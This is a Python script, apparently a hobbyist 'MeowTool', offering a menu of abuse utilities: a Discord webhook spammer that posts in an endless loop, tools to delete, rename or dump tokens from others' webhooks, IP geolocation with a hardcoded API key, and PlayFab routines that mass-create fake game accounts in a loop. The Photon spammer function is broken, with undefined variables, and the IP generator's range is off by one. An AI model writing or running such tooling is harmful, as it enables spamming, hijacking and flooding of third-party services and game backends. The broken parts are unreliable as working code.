import os
import requests
import time
import random
import fade
from colorama import Fore
os.system("clear")

print(fade.pinkred("""
            ███╗   ███╗███████╗ ██████╗ ██╗    ██╗████████╗ ██████╗  ██████╗ ██╗     
            ████╗ ████║██╔════╝██╔═══██╗██║    ██║╚══██╔══╝██╔═══██╗██╔═══██╗██║     
            ██╔████╔██║█████╗  ██║   ██║██║ █╗ ██║   ██║   ██║   ██║██║   ██║██║     
            ██║╚██╔╝██║██╔══╝  ██║   ██║██║███╗██║   ██║   ██║   ██║██║   ██║██║     
            ██║ ╚═╝ ██║███████╗╚██████╔╝╚███╔███╔╝   ██║   ╚██████╔╝╚██████╔╝██████╗
            ╚═╝     ╚═╝╚══════╝ ╚═════╝  ╚══╝╚══╝    ╚═╝    ╚═════╝  ╚═════╝ ╚═════╝          """))

def clear():
 os.system("clear")

def Playfab_Spam():
 clear()
 titleid = input(str("Enter PlayFab TitleId: "))

 while True:
  customid = random.randint(1000, 900000)

  header = {
  "Content-Type": "Application/json"
  }
  body = {
  "TitleId": titleid,
  "CustomId": customid,
  "CreateAccount": True
  }
  post = requests.post(f"https://{titleid}.playfabapi.com/Client/LoginWithCustomID", json=body, headers=header)
  print("Account Created.")

def Webhook_Spam():
 clear()
 print("")
 webhook = input(str("Enter Webhook URL: "))
 content = input(str("Message: "))
 delay = float(input("Enter a Delay: "))

 stuff = {
 "content": content
 }

 while True:
  time.sleep(delay)
  requests.post(webhook, json=stuff)
  print("Sent.")

def Webhook_Delete():
 clear()
 webhook2 = input(str("Enter Webhook URL: "))
 requests.delete(webhook2)

def Webhook_Info():
 clear()
 Webhook3 = input("Enter Webhook URL: ")
 response = requests.get(Webhook3)

 stuff = response.json()
 token = stuff.get("token")
 name = stuff.get("name")
 id = stuff.get("id")
 guild_id = stuff.get("guild_id")
 channel_id = stuff.get("channel_id")

 print(f"Token: {token}")
 print(f"Name: {name}")
 print(f"Id: {id}")
 print(f"Guild Id: {guild_id}")
 print(f"Channel Id: {channel_id}")

def IP_Geolocate():
 clear()
 ip = input("Enter Ip: ")
 response2 = requests.get(f"https://api.ipgeolocation.io/ipgeo?apiKey=86f1f41c3ccc4c90bf5b4d5e0dae6cd0&ip{ip}")

 info = response2.json()
 hostname = info.get("hostname")
 country_name = info.get("country_name")
 state_prov = info.get("state_prov")
 city = info.get("city")
 zipcode = info.get("zipcode")
 latitude = info.get("latitude")
 longitude = info.get("longitude")

 print(f"Ip: {ip}")
 print(f"Hostname: {hostname}")
 print(f"Country: {country_name}")
 print(f"Province: {state_prov}")
 print(f"City: {city}")
 print(f"Zipcode: {zipcode}")
 print(f"Latitude: {latitude}")
 print(f"Longitude: {longitude}")

def Photon_Spam():
 titleid2 = input(str("Enter TitleId: "))
 photonid = input(str("Enter Photon Id (Appid/Realtime): "))

 while True:
  header2 = {
  "X-Authorization": "True"
 }

 body2 = {
  "PhotonApplicationId": photonappid
 }

 response = requests.post(f"https://{titleid2}.playfabapi.com/Client/GetPhotonAuthenticationToken", json=body, headers=header)
 print("Account created successfully.")

def Generate_IP():
 clear()
 amount = int(input("How many IPs: "))
 for _ in range(amount):
  print(f"{random.randint(0,256)}.{random.randint(0,256)}.{random.randint(0,256)}.{random.randint(0,256)}")
 
def Catalog_Pull():
 clear()
 titleid3 = input(str("Enter PlayFab TitleId: "))

 customid3 = random.randint(1000, 900000)

 header3 = {
  "Content-Type": "Application/json"
}
 body3 = {
  "TitleId": titleid3,
  "CustomId": customid3,
  "CreateAccount": True
}
 post = requests.post(f"https://{titleid3}.playfabapi.com/Client/LoginWithCustomID", json=body3, headers=header3)

 data3 = post.json()
 SessionTicket = data3.get("data", {}).get("SessionTicket")

 header3 = {
 "Content-Type": "Application/json",
 "X-PlayFabSDK": "PlayFabSDK/2.94.210118",
 "X-Authorization": SessionTicket
}

 catalog_data = requests.post(f"https://{titleid3}.playfabapi.com/Client/GetCatalogItems", headers=header3)
 data_catalog = catalog_data.json()
 datalog_cata = data_catalog.get("data", {}).get("Catalog")
 print(datalog_cata)

def Change_Name():
 clear()
 webhook4 = input(str("Enter Webhook URL: "))
 name2 = input(str("Enter Name: "))

 body4 = {
 "name": name2
 }

 requests.patch(webhook4, json=body4)
 print("Changed Name Succesfully.")
    
#------------------------------------#

print(Fore.LIGHTMAGENTA_EX + """ 
            Webhooks                           IP                          Photon/PlayFab
  ╔══════════════════════════╗     ╔══════════════════════════╗     ╔══════════════════════════╗
                
   [1] Webhook Spammer               [5] IP Geolocator                [7] PlayFab Spammer
   [2] Webhook Deleter               [6] IP Generator                 [8] Photon CCU Spammer
   [3] Webhook Info              	                              [9] Catalog Puller
   [4] Webhook Name Changer

  ╚══════════════════════════╝     ╚══════════════════════════╝     ╚══════════════════════════╝

[Quit]
""")
Option = input("> ")
if Option == "1":
 Webhook_Spam()
elif Option == "2":
 Webhook_Delete()
elif Option == "3":
 Webhook_Info()
elif Option == "4":
 Change_Name()
elif Option == "5":
 IP_Geolocate()
elif Option == "6":
 Generate_IP()
elif Option == "7":
 Playfab_Spam()
elif Option == "8":
 Photon_Spam()
elif Option == "9":
 Catalog_Pull()

elif Option.lower() == "quit":
 clear()
elif Option.upper() == "QUIT":
 clear()
else:
 print("Invalid Option")
